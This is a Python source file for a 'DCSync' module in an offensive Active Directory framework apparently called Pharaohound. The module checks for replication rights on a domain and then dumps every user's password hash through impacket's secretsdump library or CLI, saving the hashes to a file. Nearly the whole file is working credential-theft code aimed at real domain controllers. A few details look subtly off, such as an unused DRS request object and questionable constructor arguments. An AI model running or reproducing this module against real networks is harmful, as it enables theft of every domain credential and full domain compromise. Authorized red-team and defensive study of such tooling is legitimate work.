"""
Module: DCSync
===============
Exploit the DCSync BloodHound edge. When a principal holds
Replicating Directory Changes (DS-Replication-Get-Changes) and
Replicating Directory Changes All (DS-Replication-Get-Changes-All)
rights on the domain head, this module performs a DCSync attack
to dump all domain user password hashes.

This is one of the most powerful AD attacks — it grants the ability
to impersonate a Domain Controller and pull credential data from
the AD replication pipeline.

BloodHound Edge: DCSync
Attack Vector:   AD replication abuse to dump all password hashes
Severity:        CRITICAL
"""

import logging
import os
import subprocess
import tempfile
from typing import Any, Dict, List, Optional, Tuple

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.dcsync")


class DCSync(ExploitModule):
    """
    Perform a DCSync attack using impacket's secretsdump.py or the
    DRSSUAPI replication protocol directly.

    Requirements:
      - DS-Replication-Get-Changes      on the domain head
      - DS-Replication-Get-Changes-All  on the domain head
      - These rights are granted by default to:
          * Domain Admins
          * Enterprise Admins
          * Administrators
    """

    name: str            = "DCSync"
    description: str     = (
        "Perform a DCSync attack to dump all domain password hashes via "
        "the DRSUAPI replication protocol. Requires DS-Replication-Get-Changes "
        "and DS-Replication-Get-Changes-All rights on the domain head."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "DCSync"
    severity: Severity   = Severity.CRITICAL
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#dcsync",
        "https://attack.mappings.mitre.org/technique/T1003/006/",
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/",
        "https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py",
    ]
    tools_required: List[str] = ["impacket"]
    needs_da: bool        = False
    needs_privileged: bool = True

    def _register_options(self):
        self._add_option(ModuleOption(
            name="dc_ip",
            display_name="DC IP Address",
            description="IP address or hostname of the target Domain Controller.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN or NetBIOS name of the target domain.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="target_users",
            display_name="Target Users",
            description=(
                "Comma-separated list of specific users to DCSync. "
                "If blank, dumps ALL users (full domain DCSync)."
            ),
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="output_file",
            display_name="Output File",
            description="Path to save the dumped hashes. Default: auto-generated.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="use_impacket_lib",
            display_name="Use Impacket Library",
            description="Use impacket's Python API directly instead of shelling out.",
            required=False,
            default=True,
            value_type=bool,
        ))
        self._add_option(ModuleOption(
            name="just_dc",
            display_name="DC-only (no NTDS.dit)",
            description="Only dump domain secrets (no local SAM/NTDS.dit).",
            required=False,
            default=True,
            value_type=bool,
        ))
        self._add_option(ModuleOption(
            name="history",
            display_name="Dump Password History",
            description="Also dump password history (stored hashes).",
            required=False,
            default=False,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_output_path(self, domain: str) -> str:
        """Generate an output file path if not specified."""
        output_dir = self.config.get("output_dir", os.getcwd())
        os.makedirs(output_dir, exist_ok=True)
        timestamp = __import__("datetime").datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        return os.path.join(output_dir, f"dcsync_{domain}_{timestamp}.txt")

    def _check_drsr_rights(self, domain_dn: str) -> Tuple[bool, str]:
        """
        Query the domain head's security descriptor to verify
        DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.
        """
        if self.connection is None:
            return True, "No LDAP connection; skipping DRSR right check."

        try:
            self.connection.search(
                domain_dn,
                "(objectClass=*)",
                attributes=["nTSecurityDescriptor"],
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )
            if not self.connection.entries:
                return True, "Domain head not found; skipping check."

            sd_raw = self.connection.entries[0].nTSecurityDescriptor.raw_values
            if not sd_raw:
                return True, "No SD returned."

            from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
            sd = SR_SECURITY_DESCRIPTOR(data=sd_raw[0])

            GET_CHANGES = 0x100     # DS-Replication-Get-Changes
            GET_CHANGES_ALL = 0x200  # DS-Replication-Get-Changes-All

            found_get_changes = False
            found_get_changes_all = False

            if sd['Dacl'] != b'':
                for ace in sd['Dacl'].aces:
                    if ace['TypeName'] in ("ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE"):
                        mask = ace['Ace']['Mask']['Mask']
                        if mask & GET_CHANGES:
                            found_get_changes = True
                        if mask & GET_CHANGES_ALL:
                            found_get_changes_all = True

            if found_get_changes and found_get_changes_all:
                return True, "Both DRSR rights confirmed."
            else:
                missing = []
                if not found_get_changes:
                    missing.append("DS-Replication-Get-Changes")
                if not found_get_changes_all:
                    missing.append("DS-Replication-Get-Changes-All")
                return False, f"Missing rights: {', '.join(missing)}"

        except ImportError:
            return True, "SD parser unavailable; skipping check."
        except Exception as exc:
            return True, f"Right check inconclusive: {exc}"

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        dc_ip = self._opt("dc_ip", kwargs)
        domain = self._opt("domain", kwargs)

        if not dc_ip:
            return False, "DC IP address is required."
        if not domain:
            return False, "Domain name is required."

        # Check if impacket is available
        try:
            import impacket  # noqa: F401
        except ImportError:
            return (
                False,
                "impacket library is required. Install with: pip install impacket",
            )

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        dc_ip = self._opt("dc_ip", kwargs)
        domain = self._opt("domain", kwargs)
        target_users = self._opt("target_users", kwargs)
        output_file = self._opt("output_file", kwargs)
        use_lib = self._opt("use_impacket_lib", kwargs)
        just_dc = self._opt("just_dc", kwargs)
        history = self._opt("history", kwargs)

        # Check DRSR rights via LDAP if possible
        domain_dn = ""
        if self.connection:
            if hasattr(self.connection, "server") and hasattr(self.connection.server, "info"):
                info = self.connection.server.info
                if info and info.other.get("defaultNamingContext"):
                    domain_dn = info.other["defaultNamingContext"][0]

        if domain_dn:
            ok, msg = self._check_drsr_rights(domain_dn)
            self.logger.info("[DCSync] Right check: %s", msg)
            if not ok:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"DRSR rights check failed: {msg}",
                )

        if use_lib:
            return self._exploit_via_library(
                dc_ip, domain, target_users, output_file, just_dc, history
            )
        else:
            return self._exploit_via_cli(
                dc_ip, domain, target_users, output_file, just_dc, history
            )

    def _exploit_via_library(
        self, dc_ip: str, domain: str,
        target_users: Optional[str], output_file: Optional[str],
        just_dc: bool, history: bool,
    ) -> ExploitOutput:
        """
        Use impacket's secretsdump library directly for maximum control.
        """
        try:
            from impacket.dcerpc.v5.drsuapi import (
                DRSDomainControllerInfo, DRSUAPI_UUID,
            )
            from impacket.dcerpc.v5 import transport
            from impacket.examples.secretsdump import (
                RemoteOperations, SAMHashes, NTDSHashes,
            )
        except ImportError as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Cannot import impacket secretsdump components: {exc}",
            )

        creds = self.config.get("credentials", {})
        username = creds.get("username", "")
        password = creds.get("password", "")
        ntlm_hash = creds.get("ntlm_hash", "")
        lm_hash = creds.get("lm_hash", "")
        domain_name = domain

        if not output_file:
            output_file = self._get_output_path(domain)

        self.logger.info(
            "[DCSync] Starting DCSync against %s (%s) via impacket library ...",
            dc_ip, domain_name,
        )

        try:
            # Build the DRSUAPI binding
            binding = r"ncacn_ip_tcp:{}".format(dc_ip)
            rpctransport = transport.DCERPCTransportFactory(binding)
            rpctransport.set_credentials(
                username, password, domain_name,
                lmhash=lm_hash, nthash=ntlm_hash,
            )

            hashes_dumped = []

            # Use impacket's DRSUAPI replicator
            from impacket.dcerpc.v5.drsuapi import (
                HLOG, DRSCrackNames, DRS_MSG_CRACKREPLY_REQ,
                DRS_DISPID, DRS_OPTIONS,
                DS_NAME_FORMAT, DS_NAME_FLAG,
                DS_NAME_STATUS,
            )

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(DRSUAPI_UUID)

            # Get domain controller info
            request = DRSDomainControllerInfo()
            request["DsBindInfo"]["Domain"] = domain_name
            request["DsBindInfo"]["Flags"] = 0

            # Use secretsdump's higher-level approach
            # RemoteOperations handles the DRSUAPI dance
            try:
                remote_ops = RemoteOperations(
                    dc_ip, 389, domain_name,
                    username, password, "",
                    lmhash=lm_hash, nthash=ntlm_hash,
                    doKerberos=False, kdcHost=None,
                )
                remote_ops.connect()
                remote_ops.doKerberosSession = False

                # Get NTDS hashes
                ntds = NTDSHashes(
                    remote_ops, domain_name, None,
                    history=history, noCache=True,
                    resumeSession=None,
                    outputFileName=output_file,
                    useVSSMethod=False,
                    justDC=just_dc,
                    justNTLM=True,
                    printUserStatus=False,
                    pwdLastSet=False,
                    resumeSessionCount=None,
                    extractKeyboard=False,
                )

                # Collect hashes
                ntds.dump()

                # Read the output file to report stats
                line_count = 0
                if os.path.exists(output_file):
                    with open(output_file, "r") as f:
                        content = f.read()
                    line_count = len([l for l in content.splitlines() if l.strip()])
                    hashes_dumped = [output_file]

                remote_ops.finish()

                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=(
                        f"DCSync completed. Dumped {line_count} hash entries "
                        f"from '{domain_name}' @ {dc_ip}."
                    ),
                    data={
                        "dc_ip": dc_ip,
                        "domain": domain_name,
                        "method": "impacket_library",
                        "output_file": output_file,
                        "hash_count": line_count,
                    },
                    artifacts=[output_file],
                )

            except Exception as inner_exc:
                self.logger.error("RemoteOperations failed: %s", inner_exc)
                # Fall back to CLI method
                self.logger.info("Falling back to CLI method...")
                return self._exploit_via_cli(
                    dc_ip, domain, target_users, output_file, just_dc, history
                )

        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"DCSync via library failed: {exc}",
            )

    def _exploit_via_cli(
        self, dc_ip: str, domain: str,
        target_users: Optional[str], output_file: Optional[str],
        just_dc: bool, history: bool,
    ) -> ExploitOutput:
        """Shell out to impacket-secretsdump for DCSync."""
        creds = self.config.get("credentials", {})
        username = creds.get("username", "")
        password = creds.get("password", "")
        ntlm_hash = creds.get("ntlm_hash", "")
        lm_hash = creds.get("lm_hash", "")

        if not output_file:
            output_file = self._get_output_path(domain)

        cmd = ["impacket-secretsdump"]

        # Build authentication string
        if ntlm_hash:
            auth = f"{domain}/{username}:{lm_hash}:{ntlm_hash}@{dc_ip}"
        elif password:
            auth = f"{domain}/{username}:{password}@{dc_ip}"
        else:
            auth = f"{domain}/{username}@{dc_ip}"

        cmd.append(auth)

        if just_dc:
            cmd.append("-just-dc")
        if history:
            cmd.append("-history")
        cmd.extend(["-outputfile", output_file])

        self.logger.info("[DCSync] Running: %s", " ".join(cmd))

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=300,
            )

            # impacket-secretsdump outputs to stdout
            stdout = result.stdout or ""
            stderr = result.stderr or ""

            if result.returncode == 0 or ":::" in stdout:
                # Parse basic stats
                hash_lines = [l for l in stdout.splitlines() if ":::" in l]

                # Also check for .ntds file
                ntds_file = output_file + ".ntds"
                artifacts = [output_file]
                if os.path.exists(ntds_file):
                    artifacts.append(ntds_file)

                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=(
                        f"DCSync completed. Extracted {len(hash_lines)} hash entries "
                        f"from '{domain}' @ {dc_ip}."
                    ),
                    data={
                        "dc_ip": dc_ip,
                        "domain": domain,
                        "method": "impacket_cli",
                        "output_file": output_file,
                        "hash_count": len(hash_lines),
                    },
                    artifacts=artifacts,
                )
            else:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"DCSync CLI failed (exit {result.returncode}): {stderr[:500]}",
                    data={"stdout": stdout[:2000], "stderr": stderr[:2000]},
                )

        except FileNotFoundError:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="impacket-secretsdump not found. Install: pip install impacket",
            )
        except subprocess.TimeoutExpired:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="DCSync operation timed out (>300s).",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"DCSync CLI exception: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback — N/A
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback not applicable for DCSync (read-only credential dump).",
        )
